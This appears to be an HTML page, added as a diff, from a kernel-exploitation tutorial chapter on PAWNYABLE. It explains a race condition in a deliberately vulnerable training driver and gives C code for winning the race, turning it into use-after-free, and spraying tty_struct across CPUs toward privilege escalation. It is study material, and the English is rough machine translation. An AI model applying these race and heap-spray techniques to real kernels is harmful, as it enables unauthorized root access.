@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" name="viewport"/>
+<meta content="https://pawnyable.cafe/linux-kernel/LK01/race_condition.html" name="og:url"/>
+<meta content="Holstein v4: Race Condition - PAWNYABLE!" name="og:title"/>
+<meta content="https://pawnyable.cafe/pawnyable.ogp.png" name="og:image"/>
+<meta content="fluffy pwn world" name="og:description"/>
+<meta content="website" name="og:type"/>
+<meta content="PAWNYABLE!" name="og:site_name"/>
+<meta content="ie=edge" http-equiv="X-UA-Compatible"/>
+<meta content="ptr-yudai" name="author"/>
+<meta content="pawnyable" name="subtitle"/>
+<meta content="Let's learn pwnable with cute animals." name="description"/>
+<meta content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable" name="keywords"/>
+<title>Holstein v4: Race Condition | PAWNYABLE!</title>
+<link href="/favicon.png" rel="icon"/>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+<!-- stylesheets list from _config.yml -->
+<link href="/css/style.css" rel="stylesheet"/>
+<!-- scripts list from _config.yml -->
+<script src="/js/frame.js"></script>
+<style type="text/css">
+.spoiler {
+  display: inline-flex;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta content="Hexo 5.4.2" name="generator"/></head>
+<body>
+<div class="mask-border">
+</div>
+<div class="wrapper">
+<div class="header">
+<div class="flex-container">
+<div class="header-inner">
+<div class="site-brand-container">
+<a href="/">PAWNYABLE</a>
+</div>
+<div class="menu-btn" id="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+<nav class="site-nav">
+<ul class="menu-list">
+<li class="menu-item">
+<a href="/practice/">Practice</a>
+</li>
+<li class="menu-item">
+<a href="/about/">About</a>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="main">
+<div class="flex-container">
+<article id="post">
+<div class="post-head">
+<div class="post-info">
+<div class="post-title">
+            
+                Holstein v4: Race Condition
+                        
+        </div>
+</div>
+<div class="h-line-primary"></div>
+<div class="pagination">
+<div class="pagination-bk"><a href="use_after_free.html">Previous page</a></div>
+<div class="pagination-index"><a href="../index.html">Go to table of contents</a></div>
+<div class="pagination-fd"><a href="../LK02/null_ptr_deref.html">Next page</a></div>
+</div>
+<div class="column" title="table of contents">
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%83%91%E3%83%83%E3%83%81%E3%81%AE%E8%A7%A3%E6%9E%90"><span class="toc-text">Patch analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Race-Condition"><span class="toc-text">Race Condition</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BA%E7%94%9F%E6%9D%A1%E4%BB%B6"><span class="toc-text">Occurrence conditions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%B6%E5%90%88%E3%82%92%E6%88%90%E5%8A%9F%E3%81%95%E3%81%9B%E3%82%8B"><span class="toc-text">make the competition successful</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CPU%E3%81%A8Heap-Spray"><span class="toc-text">CPU and Heap Spray</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC"><span class="toc-text">Privilege escalation</span></a></li></ol>
+</div>
+</div>
+<div class="post-content">
+<p><a href="use_after_free.html">previous chapter</a>Here, we exploited the Holstein module's Use-after-Free feature to escalate privileges. Third time being honest, the developers of the Holstein module fixed the module in a third patch and released Holstein v4. According to the developer, there are no more vulnerabilities and updates will no longer be available. In this chapter, we will exploit the final version of Holstein module v4.</p>
+<h2 id="パッチの解析">Patch analysis</h2>
+<p>The final version v4 is<a href="distfiles/LK01-4.tar.gz">here</a>It can be downloaded from. First, let's look at the differences with v3.<br/>First the startup script<code>run.sh</code>However, it has been modified to work with multiple cores.</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/></pre></td><td class="code"><pre><span class="line"><span class="deletion">-    -smp 1 \</span></span><br/><span class="line"><span class="addition">+    -smp 2 \</span></span><br/></pre></td></tr></table></figure>
+<p>In the program, memory leaks and use-after-free issues have been fixed.<br/>The first one is<code>open</code>And if someone has already opened the driver, the variable<code>mutex</code>becomes 1,<code>open</code>is designed to fail.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/><span class="line">14</span><br/><span class="line">15</span><br/><span class="line">16</span><br/><span class="line">17</span><br/><span class="line">18</span><br/><span class="line">19</span><br/><span class="line">20</span><br/><span class="line">21</span><br/></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> mutex = <span class="number">0</span>;</span><br/><span class="line"><span class="type">char</span> *g_buf = <span class="literal">NULL</span>;</span><br/><span class="line"></span><br/><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br/><span class="line">{</span><br/><span class="line">  printk(KERN_INFO <span class="string">"module_open called\n"</span>);</span><br/><span class="line"></span><br/><span class="line">  <span class="keyword">if</span> (mutex) {</span><br/><span class="line">    printk(KERN_INFO <span class="string">"resource is busy"</span>);</span><br/><span class="line">    <span class="keyword">return</span> -EBUSY;</span><br/><span class="line">  }</span><br/><span class="line">  mutex = <span class="number">1</span>;</span><br/><span class="line"></span><br/><span class="line">  g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);</span><br/><span class="line">  <span class="keyword">if</span> (!g_buf) {</span><br/><span class="line">    printk(KERN_INFO <span class="string">"kmalloc failed"</span>);</span><br/><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br/><span class="line">  }</span><br/><span class="line"></span><br/><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br/><span class="line">}</span><br/></pre></td></tr></table></figure>
+<p>In other words,<code>open</code>It is no longer possible to open the driver again during the installation. open file descriptor<code>close</code>Then<code>mutex</code>returns to 0 and again<code>open</code>It becomes possible.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br/><span class="line">{</span><br/><span class="line">  printk(KERN_INFO <span class="string">"module_close called\n"</span>);</span><br/><span class="line">  kfree(g_buf);</span><br/><span class="line">  mutex = <span class="number">0</span>;</span><br/><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br/><span class="line">}</span><br/></pre></td></tr></table></figure>
+<p>Where are the vulnerabilities? Think about it for a moment.</p>
+<h2 id="Race-Condition">Race Condition</h2>
+<p>Although this driver implementation may seem perfect, it is still<strong>Access multiple processes or resources</strong>This situation has not been completely taken into account.<br/>The OS implements context switches so that multiple processes (threads) can run simultaneously, and manages processes so that multiple programs can run with multiple threads. The timing at which a context switch occurs is not at a large granularity like a function, but at a unit of assembly instruction.<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>It will be. Naturally,<code>module_open</code>It is also possible for the context to switch during function execution.<br/>In this chapter, we will discuss the problems that occur in such multi-threaded and multi-process<strong>competition</strong>We will write an exploit by exploiting the problem (Race Condition).</p>
+<h3 id="発生条件">Occurrence conditions</h3>
+<p>First, consider the consequences of race conditions. For example, consider a case where the context is switched in the following execution order.</p>
+<center>
+<img alt="Example of correct behavior in multithreading" src="img/race1.png" style="width:620px;"/>
+</center>
+<p>At the beginning<code>mutex</code>contains 0, so a jump occurs at the conditional branch of thread 1,<code>g_buf</code>Reach the path to secure it. More blue commands<code>g_buf</code>The address will be entered in.<br/>A context switch then occurs and execution switches to thread 2. At the stage of thread 2<code>mutex</code>contains 1, so no jump occurs in the conditional branch, and the path that returns EBUSY is reached.<code>open</code>fails.<br/>So in this example<code>module_open</code>is working as expected by the developer.<br/>Next, consider the execution order in the figure below.</p>
+<center>
+<img alt="Example of operation that falls into Race Condition" src="img/race2.png" style="width:620px;"/>
+</center>
+<p>As before, in thread 1<code>g_buf</code>Reach the path to secure it. But this time<code>mutex</code>A context switch occurs before putting 1 into .<br/>Then, at the conditional branch stage of thread 2,<code>mutex</code>Since there is a 0 in<code>g_buf</code>Reach the path to secure it. And with the blue command<code>g_buf</code>will contain the reserved address.<br/>Naturally, a context switch occurs after that and execution switches to thread 1, but thread 1 allocates a buffer and uses the red instruction to write the address.<code>g_buf</code>Save it to<br/>Then both threads<code>open</code>is successful, and you can see that the address reserved by thread 1 is available for use by both threads.</p>
+<p>In this way, when designing kernel space code, bugs will occur if you do not always take multithreading into account.</p>
+<div class="balloon_l">
+<div class="faceicon"><img alt="Wolf-kun" src="../img/wolf_atamawaru.png"/></div>
+<p class="says">The conflict was caused by not using atomic operations to read and write the variable mutex.</p>
+</div>
+<p><code>open</code>If is successful twice, for one<code>close</code>Even if called<code>g_buf</code>remains pointing to the freed pointer, causing the same use-after-free as in the previous chapter.</p>
+<h3 id="競合を成功させる">make the competition successful</h3>
+<p>First<code>open</code>Let's write some code and find out if this conflict is really possible.<br/>in multiple threads<code>open</code>A conflict can easily occur if you call ``() in succession, but you cannot exit the loop unless you determine that the conflict was successful. There are various ways to determine conflict, but basically it is determined from two threads.<code>read</code>It would be reasonable to consider that the competition was successful if both were successful. Also, this time it's useless<code>read</code>To reduce calls, I decided to check the file descriptor. Because from two threads<code>open</code>If it succeeds, one of the file disks should always be 4.<br/>The author wrote Race, which can create a race condition by running the same function in two threads, as shown below. Of course, you can loop in the main thread, and design the race condition determination method as you like. In addition, the compile option<code>-lpthread</code>with<code>libpthread</code>Don't forget to link the .</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/><span class="line">14</span><br/><span class="line">15</span><br/><span class="line">16</span><br/><span class="line">17</span><br/><span class="line">18</span><br/><span class="line">19</span><br/><span class="line">20</span><br/><span class="line">21</span><br/><span class="line">22</span><br/><span class="line">23</span><br/><span class="line">24</span><br/><span class="line">25</span><br/><span class="line">26</span><br/><span class="line">27</span><br/><span class="line">28</span><br/><span class="line">29</span><br/><span class="line">30</span><br/><span class="line">31</span><br/><span class="line">32</span><br/><span class="line">33</span><br/><span class="line">34</span><br/><span class="line">35</span><br/><span class="line">36</span><br/><span class="line">37</span><br/><span class="line">38</span><br/><span class="line">39</span><br/><span class="line">40</span><br/></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">race</span><span class="params">(<span class="type">void</span> *arg)</span> {</span><br/><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) {</span><br/><span class="line">    <span class="comment">// Attempt contention until fd reaches 4 in either thread</span></span><br/><span class="line">    <span class="keyword">while</span> (!win) {</span><br/><span class="line">      <span class="type">int</span> fd = open(<span class="string">"/dev/holstein"</span>, O_RDWR);</span><br/><span class="line">      <span class="keyword">if</span> (fd == <span class="number">4</span>) win = <span class="number">1</span>;</span><br/><span class="line">      <span class="keyword">if</span> (win == <span class="number">0</span> &amp;&amp; fd != <span class="number">-1</span>) close(fd);</span><br/><span class="line">    }</span><br/><span class="line"></span><br/><span class="line">    <span class="comment">// Check that the other thread has not closed the fd by accident</span></span><br/><span class="line">    <span class="keyword">if</span> (write(<span class="number">3</span>, <span class="string">"A"</span>, <span class="number">1</span>) != <span class="number">1</span> || write(<span class="number">4</span>, <span class="string">"a"</span>, <span class="number">1</span>) != <span class="number">1</span>) {</span><br/><span class="line">      <span class="comment">// failure</span></span><br/><span class="line">      close(<span class="number">3</span>);</span><br/><span class="line">      close(<span class="number">4</span>);</span><br/><span class="line">      win = <span class="number">0</span>;</span><br/><span class="line">    } <span class="keyword">else</span> {</span><br/><span class="line">      <span class="comment">// success</span></span><br/><span class="line">      <span class="keyword">break</span>;</span><br/><span class="line">    }</span><br/><span class="line">  }</span><br/><span class="line"></span><br/><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br/><span class="line">}</span><br/><span class="line"></span><br/><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br/><span class="line">  <span class="type">pthread_t</span> th1, th2;</span><br/><span class="line"></span><br/><span class="line">  pthread_create(&amp;th1, <span class="literal">NULL</span>, race, <span class="literal">NULL</span>);</span><br/><span class="line">  pthread_create(&amp;th2, <span class="literal">NULL</span>, race, <span class="literal">NULL</span>);</span><br/><span class="line">  pthread_join(th1, <span class="literal">NULL</span>);</span><br/><span class="line">  pthread_join(th2, <span class="literal">NULL</span>);</span><br/><span class="line"></span><br/><span class="line">  <span class="type">char</span> buf[<span class="number">0x400</span>];</span><br/><span class="line">  <span class="type">int</span> fd1 = <span class="number">3</span>, fd2 = <span class="number">4</span>;</span><br/><span class="line">  write(fd1, <span class="string">"Hello"</span>, <span class="number">5</span>);</span><br/><span class="line">  read(fd2, buf, <span class="number">5</span>);</span><br/><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br/><span class="line"></span><br/><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br/><span class="line">}</span><br/></pre></td></tr></table></figure>
+<p>This shows that the race will be successful with almost 100% probability. The time it takes to complete a race is measured in milliseconds, making it fully usable as a primitive.</p>
+<div class="column" title="Column: Race conditions and data races">"Race condition" and "data race" are similar words, but they have different meanings, and they are not parallel words that complement each other.<br/>A data race is a situation in which two threads simultaneously (asynchronously) access (at least one writes) data at a certain location in memory. Therefore, data races cause undefined behavior. Data conflicts can be resolved with appropriate exclusive control and atomic operations.<br/>On the other hand, a race condition refers to a situation where different results are produced depending on the order of execution of multiple threads. A race condition is the same as a logic bug; it simply works that way because the programmer wrote it that way, and although it causes unexpected behavior, it has nothing to do with unsound behavior. When multithreading produces results that are contrary to the programmer's intentions, we can say that there is a race condition bug.<br/>This driver has a race condition due to an implementation error that causes a data race on the buffer pointer.</div>
+<h2 id="CPUとHeap-Spray">CPU and Heap Spray</h2>
+<p>There are many cases where conflict exploitation is implemented in multi-threads like this time, but there are some things you need to be careful about when doing so.<br/>The race condition in multiple threads means multiple CPU cores are being used during the attack. Then, of course, from either CPU core<code>module_open</code>was called<code>kzalloc</code>The memory area will be secured.<br/>Here, previously explained in the Heap Overflow chapter<a href="heap_overflow#slub%E3%82%A2%E3%83%AD%E3%82%B1%E3%83%BC%E3%82%BF">SLUB allocator</a>Let's recall the characteristics of The SLUB allocator manages slabs used for allocating objects in memory areas for each CPU.<br/>That is, now<code>main</code>The function is allocated from a different CPU core than the thread on which it is running.<code>g_buf</code>but<code>kfree</code>When this happens, it will naturally be linked to the slab that corresponds to the CPU core at the time of allocation. Then, after that<code>main</code>Even if you do Heap Spray from the thread,<code>kfree</code>was done<code>g_buf</code>It will not overlap.<br/>Therefore, in a situation like this<strong>Run Heap Spray with multiple threads</strong>Please be careful.</p>
+<p>Also,<code>/dev/ptmx</code>A new file descriptor is created by opening it, but there is a limit to the number of file descriptors that one process can create, so if a large amount of spray is required, it is necessary to devise measures such as closing unrelated file descriptors as soon as the spray hits.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/><span class="line">14</span><br/><span class="line">15</span><br/><span class="line">16</span><br/><span class="line">17</span><br/><span class="line">18</span><br/><span class="line">19</span><br/><span class="line">20</span><br/><span class="line">21</span><br/><span class="line">22</span><br/><span class="line">23</span><br/><span class="line">24</span><br/><span class="line">25</span><br/><span class="line">26</span><br/><span class="line">27</span><br/><span class="line">28</span><br/><span class="line">29</span><br/><span class="line">30</span><br/><span class="line">31</span><br/><span class="line">32</span><br/><span class="line">33</span><br/><span class="line">34</span><br/><span class="line">35</span><br/><span class="line">36</span><br/><span class="line">37</span><br/><span class="line">38</span><br/><span class="line">39</span><br/><span class="line">40</span><br/><span class="line">41</span><br/><span class="line">42</span><br/></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">spray_thread</span><span class="params">(<span class="type">void</span> *args)</span> {</span><br/><span class="line">  <span class="type">long</span> x;</span><br/><span class="line">  <span class="type">long</span> spray[<span class="number">800</span>];</span><br/><span class="line"></span><br/><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">800</span>; i++) {</span><br/><span class="line">    usleep(<span class="number">10</span>);</span><br/><span class="line">    <span class="comment">//spray of tty_struct</span></span><br/><span class="line">    spray[i] = open(<span class="string">"/dev/ptmx"</span>, O_RDONLY | O_NOCTTY);</span><br/><span class="line">    <span class="keyword">if</span> (spray[i] == <span class="number">-1</span>) {</span><br/><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br/><span class="line">        close(spray[j]);</span><br/><span class="line">      <span class="keyword">return</span> (<span class="type">void</span>*)<span class="number">-1</span>;</span><br/><span class="line">    }</span><br/><span class="line"></span><br/><span class="line">    <span class="keyword">if</span> (read(fd2, &amp;x, <span class="keyword">sizeof</span>(<span class="type">long</span>)) == <span class="keyword">sizeof</span>(<span class="type">long</span>) &amp;&amp; x) {</span><br/><span class="line">      <span class="comment">// hit</span></span><br/><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br/><span class="line">        close(spray[j]);</span><br/><span class="line">      <span class="keyword">return</span> (<span class="type">void</span>*)spray[i];</span><br/><span class="line">    }</span><br/><span class="line">  }</span><br/><span class="line"></span><br/><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">800</span>; i++)</span><br/><span class="line">    close(spray[i]);</span><br/><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>*)<span class="number">-1</span>;</span><br/><span class="line">}</span><br/><span class="line"></span><br/><span class="line">...</span><br/><span class="line"></span><br/><span class="line">  <span class="comment">// Create Use-after-Free</span></span><br/><span class="line">  close(fd1);</span><br/><span class="line"></span><br/><span class="line">  <span class="comment">/* Heap Spray with multiple cores */</span></span><br/><span class="line">  <span class="type">long</span> victim_fd = <span class="number">-1</span>;</span><br/><span class="line">  <span class="comment">// try on main thread</span></span><br/><span class="line">  victim_fd = (<span class="type">long</span>)spray_thread(<span class="literal">NULL</span>);</span><br/><span class="line">  <span class="comment">// If the main thread fails, use the subthread's result</span></span><br/><span class="line">  <span class="keyword">while</span> (victim_fd == <span class="number">-1</span>) {</span><br/><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] spraying on another CPU..."</span>);</span><br/><span class="line">    pthread_create(&amp;th1, <span class="literal">NULL</span>, spray_thread, <span class="literal">NULL</span>);</span><br/><span class="line">    pthread_join(th1, (<span class="type">void</span>*)&amp;victim_fd);</span><br/><span class="line">  }</span><br/></pre></td></tr></table></figure>
+<div class="balloon_l">
+<div class="faceicon"><img alt="Wolf-kun" src="../img/wolf_normal.png"/></div>
+<p class="says">By using the sched_setaffinity function, you can limit the CPU used by threads, so even if the number of cores increases, the behavior will be the same as when there are 2 cores.</p>
+</div>
+<h2 id="権限昇格">Privilege escalation</h2>
+<p>Now, just follow the same steps as before to elevate your privileges.<br/>Data race causes Use-after-Free and Heap Spray<code>tty_struct</code>If you make the sequence of posting a function into a function, you can easily write Use-after-Free multiple times.</p>
+<p>The sample exploit is<a href="exploit/race-krop.c">here</a>It can be downloaded from.</p>
+<center>
+<img alt="Privilege Escalation with Race Condition" src="img/race_privesc.png" style="width:320px;"/>
+</center>
+<p>Race condition exploits are difficult to debug, so the key to exploit development is whether the theory can be realized in the first stage and whether a primitive can be created that stably causes a race with a high probability.</p>
+<hr/>
+<div class="column" title="example">When you increase the number of CPU cores to 4 or 8 using the qemu startup option, check how likely your exploit race or spray will work.
+  Also, if the probability of failure is high, try changing to an exploit that works with a high probability regardless of the number of cores.</div>
+<hr class="footnotes-sep"/>
+<section class="footnotes">
+<ol class="footnotes-list">
+<li class="footnote-item" id="fn1"><p>Depending on the CPU, there is a more granular issue such as changing the order of execution of instructions for optimization purposes, but this is not relevant to this article, so I will not explain it.<a class="footnote-backref" href="#fnref1">↩︎</a></p>
+</li>
+</ol>
+</section>
+</div>
+<div style="margin-top: 1em">
+<div class="h-line-primary"></div>
+<div class="pagination">
+<div class="pagination-bk"><a href="use_after_free.html">Previous page</a></div>
+<div class="pagination-index"><a href="../index.html">Go to table of contents</a></div>
+<div class="pagination-fd"><a href="../LK02/null_ptr_deref.html">Next page</a></div>
+</div>
+</div>
+<script>
+    window.onload = detectors();
+</script>
+</article>
+</div>
+</div>
+<div class="footer">
+<div class="flex-container">
+<div class="footer-text">
+            
+                © 2023 ptr-yudai 🐈
+                <br/>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
